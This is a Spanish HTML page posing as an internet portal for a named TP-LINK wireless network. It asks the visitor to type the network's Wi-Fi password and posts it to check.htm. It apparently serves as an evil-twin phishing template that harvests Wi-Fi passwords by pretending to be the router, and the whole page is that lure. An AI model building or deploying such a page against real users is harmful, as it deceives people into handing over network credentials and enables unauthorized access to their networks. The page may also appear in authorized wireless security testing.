<!DOCTYPE html>
<html>
	<head>
		<meta name="viewport" content="width=device-width"/>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<title>Portal de Internet</title>
		<link rel="stylesheet" type="text/css" href="portal.css"/>
		<script type="text/javascript" src="portal.js"></script>
	</head>
	<body>
		<div class="content">
			<form method="post" id="loginform" name="loginform" action="check.htm">
				<div class="title">
					<p>Red inalámbrica, ESSID:</p>
					<span class="bold">TP-LINK_8188E4</span>
				</div>
				<p>Introduzca su contraseña de acceso a la red inalámbrica para poder acceder a internet</p>
				<label>
					<input id="password" type="password" name="password" maxlength="63" size="20" placeholder="Contraseña"/><br/>
				</label>
				<p>Mostrar contraseña <input type="checkbox" id="showpass"/></p>
				<input class="button" id="formbutton" type="button" value="Enviar"/>
			</form>
		</div>
	</body>
</html>
